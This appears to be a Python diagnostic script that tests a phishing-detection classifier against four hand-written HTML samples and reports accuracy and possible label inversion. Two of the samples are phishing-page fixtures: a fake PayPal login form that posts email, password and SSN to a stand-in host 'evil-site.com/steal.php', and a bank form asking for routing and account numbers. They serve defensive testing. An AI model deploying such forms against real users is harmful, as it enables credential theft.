"""
🧪 MODEL 2023 DIAGNOSTIC TEST
================================================================================
This script thoroughly tests Model 2023 to verify:
1. Labels are correct (0=Legitimate, 1=Phishing)
2. Model predictions make sense
3. Feature extraction is working properly
================================================================================
"""

import sys
import os
import pandas as pd
import joblib

# Add project root to path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../')))

try:
    from Data_Preprocessing.feature_extract_2023 import ContentFeatureExtractor
except ImportError:
    print("❌ Could not import ContentFeatureExtractor")
    print("   Make sure you're running from the correct directory")
    exit(1)

print("="*70)
print(" 🧪 MODEL 2023 COMPREHENSIVE DIAGNOSTIC")
print("="*70)

# ============================================================================
# STEP 1: Load Model
# ============================================================================
print("\n📥 Step 1: Loading Model 2023...")

try:
    model_path = "Models/2023/model_2023.pkl"
    features_path = "Models/2023/features_2023.pkl"
    
    model = joblib.load(model_path)
    feature_names = joblib.load(features_path)
    
    print(f"✅ Model loaded from: {model_path}")
    print(f"✅ Features loaded from: {features_path}")
    print(f"\n   Model type: {type(model).__name__}")
    print(f"   Model classes: {model.classes_}")
    print(f"   Number of features: {len(feature_names)}")
    
except Exception as e:
    print(f"❌ Error loading model: {e}")
    exit(1)

# ============================================================================
# STEP 2: Verify Model Classes
# ============================================================================
print("\n" + "="*70)
print("🔍 Step 2: Verifying Model Classes")
print("="*70)

if list(model.classes_) == [0, 1]:
    print("✅ Model classes are CORRECT: [0, 1]")
    print("   Where: 0 = Legitimate, 1 = Phishing")
elif list(model.classes_) == [1, 0]:
    print("⚠️  WARNING: Model classes are REVERSED: [1, 0]")
    print("   This will cause inverted predictions!")
else:
    print(f"❌ ERROR: Unexpected classes: {model.classes_}")
    exit(1)

# ============================================================================
# STEP 3: Test with Known HTML Samples
# ============================================================================
print("\n" + "="*70)
print("🧪 Step 3: Testing with Known HTML Samples")
print("="*70)

extractor = ContentFeatureExtractor()

# Test cases with known characteristics
test_cases = [
    {
        "name": "Legitimate Google-like",
        "html": """
        <html>
        <head><title>Search Engine</title></head>
        <body>
            <h1>Search the web</h1>
            <form action="https://search.example.com/search">
                <input type="text" name="q" placeholder="Search...">
                <button type="submit">Search</button>
            </form>
        </body>
        </html>
        """,
        "url": "https://www.google.com",
        "expected": 0,
        "description": "Clean HTML, no suspicious elements"
    },
    {
        "name": "Legitimate Facebook-like",
        "html": """
        <html>
        <head><title>Social Network</title></head>
        <body>
            <h1>Connect with friends</h1>
            <p>Join our community</p>
        </body>
        </html>
        """,
        "url": "https://www.facebook.com",
        "expected": 0,
        "description": "Simple social media page"
    },
    {
        "name": "Phishing - External Form",
        "html": """
        <html>
        <head><title>PayPal - Verify Account</title></head>
        <body>
            <form action="http://evil-site.com/steal.php" method="post">
                <input type="email" name="email" required>
                <input type="password" name="password" required>
                <input type="text" name="ssn" placeholder="SSN">
                <input type="hidden" name="redirect" value="phishing">
                <button type="submit">Login</button>
            </form>
        </body>
        </html>
        """,
        "url": "https://paypal-verify.tk",
        "expected": 1,
        "description": "External form action, hidden fields, SSN field"
    },
    {
        "name": "Phishing - Suspicious Fields",
        "html": """
        <html>
        <head><title>Bank Login</title></head>
        <body>
            <form action="verify.php">
                <input type="password" name="password">
                <input type="text" name="routing_number">
                <input type="text" name="account_number">
                <input type="hidden" name="token" value="xyz">
                <button>Submit</button>
            </form>
        </body>
        </html>
        """,
        "url": "https://secure-bank.tk",
        "expected": 1,
        "description": "Banking credentials, hidden fields"
    }
]

print(f"\nTesting {len(test_cases)} HTML samples:\n")

results = []
for i, test in enumerate(test_cases, 1):
    print(f"{'='*70}")
    print(f"Test Case {i}: {test['name']}")
    print(f"{'='*70}")
    print(f"Description: {test['description']}")
    print(f"Expected: {test['expected']} ({'Legitimate' if test['expected'] == 0 else 'Phishing'})")
    
    try:
        # Extract features
        features = extractor.extract_from_html(test['html'], test['url'])
        
        # Show some key features
        print(f"\n📊 Key Features Extracted:")
        key_features = [
            'HasExternalFormSubmit', 'HasHiddenFields', 'HasPasswordField',
            'Bank', 'Pay', 'HasSubmitButton'
        ]
        for feat in key_features:
            if feat in features:
                value = features[feat]
                if value > 0:
                    print(f"   🚨 {feat}: {value}")
        
        # Create DataFrame
        df = pd.DataFrame([features])
        df = df.reindex(columns=feature_names, fill_value=0)
        
        # Predict
        prediction = model.predict(df)[0]
        probabilities = model.predict_proba(df)[0]
        
        print(f"\n🤖 Model Prediction:")
        print(f"   Predicted Class: {prediction}")
        print(f"   Probabilities: [Legit={probabilities[0]:.4f}, Phish={probabilities[1]:.4f}]")
        print(f"   Phishing Probability: {probabilities[1]:.4f}")
        
        # Determine result
        is_correct = (prediction == test['expected'])
        
        if is_correct:
            print(f"\n✅ CORRECT!")
        else:
            print(f"\n❌ WRONG!")
            print(f"   Expected: {test['expected']}")
            print(f"   Got: {prediction}")
        
        results.append({
            'test': test['name'],
            'expected': test['expected'],
            'predicted': prediction,
            'prob_phishing': probabilities[1],
            'correct': is_correct
        })
        
    except Exception as e:
        print(f"\n❌ ERROR during test: {e}")
        import traceback
        traceback.print_exc()
        results.append({
            'test': test['name'],
            'expected': test['expected'],
            'predicted': None,
            'prob_phishing': None,
            'correct': False
        })
    
    print()

# ============================================================================
# STEP 4: Analyze Results
# ============================================================================
print("="*70)
print(" 📊 RESULTS SUMMARY")
print("="*70)

results_df = pd.DataFrame(results)

total_tests = len(results)
correct = sum(results_df['correct'])
accuracy = correct / total_tests * 100

print(f"\n✅ Tests Passed: {correct}/{total_tests} ({accuracy:.1f}%)")

print(f"\n📋 Detailed Results:")
for idx, row in results_df.iterrows():
    status = "✅" if row['correct'] else "❌"
    prob_str = f"{row['prob_phishing']:.4f}" if row['prob_phishing'] is not None else "N/A"
    print(f"{status} {row['test']}")
    print(f"   Expected: {row['expected']}, Predicted: {row['predicted']}, Prob: {prob_str}")

# ============================================================================
# STEP 5: Check for Label Inversion Pattern
# ============================================================================
print("\n" + "="*70)
print(" 🔍 LABEL INVERSION ANALYSIS")
print("="*70)

if len(results_df[results_df['predicted'].notna()]) > 0:
    # Check if legitimate samples are predicted as phishing
    legit_tests = results_df[results_df['expected'] == 0]
    phish_tests = results_df[results_df['expected'] == 1]
    
    if len(legit_tests) > 0:
        legit_as_phish = sum((legit_tests['predicted'] == 1) & (legit_tests['predicted'].notna()))
        print(f"\nLegitimate samples predicted as Phishing: {legit_as_phish}/{len(legit_tests)}")
    
    if len(phish_tests) > 0:
        phish_as_legit = sum((phish_tests['predicted'] == 0) & (phish_tests['predicted'].notna()))
        print(f"Phishing samples predicted as Legitimate: {phish_as_legit}/{len(phish_tests)}")
    
    # Analyze pattern
    if len(legit_tests) > 0 and len(phish_tests) > 0:
        if legit_as_phish > len(legit_tests) / 2:
            print("\n❌ PATTERN DETECTED: Model flags MOST legitimate samples as phishing")
            print("   → This suggests labels were INVERTED during training!")
            print("   → Model learned: legitimate features = phishing class")
        elif phish_as_legit > len(phish_tests) / 2:
            print("\n❌ PATTERN DETECTED: Model flags MOST phishing samples as legitimate")
            print("   → This suggests the model failed to learn phishing patterns")
        else:
            print("\n✅ No systematic inversion pattern detected")
            print("   → Model appears to have learned correct associations")

# ============================================================================
# STEP 6: Final Verdict
# ============================================================================
print("\n" + "="*70)
print(" 🎯 FINAL VERDICT")
print("="*70)

if accuracy >= 75:
    print(f"\n✅ Model 2023 is WORKING CORRECTLY!")
    print(f"   Accuracy: {accuracy:.1f}%")
    print(f"   Labels appear to be correct: 0=Legitimate, 1=Phishing")
elif accuracy >= 50:
    print(f"\n⚠️  Model 2023 has MODERATE accuracy")
    print(f"   Accuracy: {accuracy:.1f}%")
    print(f"   This is expected for content-only analysis")
    print(f"   Model 2023 can be fooled by legitimate-looking HTML")
elif accuracy <= 25:
    print(f"\n❌ Model 2023 has VERY LOW accuracy")
    print(f"   Accuracy: {accuracy:.1f}%")
    print(f"   This strongly suggests INVERTED LABELS during training!")
    print(f"\n   FIX REQUIRED:")
    print(f"   1. Check Dataset/LatestDataset2023.csv labels")
    print(f"   2. Verify labels are: 0=Legitimate, 1=Phishing")
    print(f"   3. Retrain Model 2023 if needed")
else:
    print(f"\n⚠️  Model 2023 accuracy is LOW")
    print(f"   Accuracy: {accuracy:.1f}%")
    print(f"   Please review the misclassifications above")

print("\n" + "="*70)
print(" ✅ DIAGNOSTIC COMPLETE")
print("="*70)

print(f"\n📝 Notes:")
print(f"   - Model 2023 only sees HTML content, not URLs")
print(f"   - It CAN be fooled by phishing sites with clean HTML")
print(f"   - This is why we need BOTH Model 2023 and Model 2025")
print(f"   - Expected accuracy for Model 2023: 50-95% (content-only)")

print("\n" + "="*70)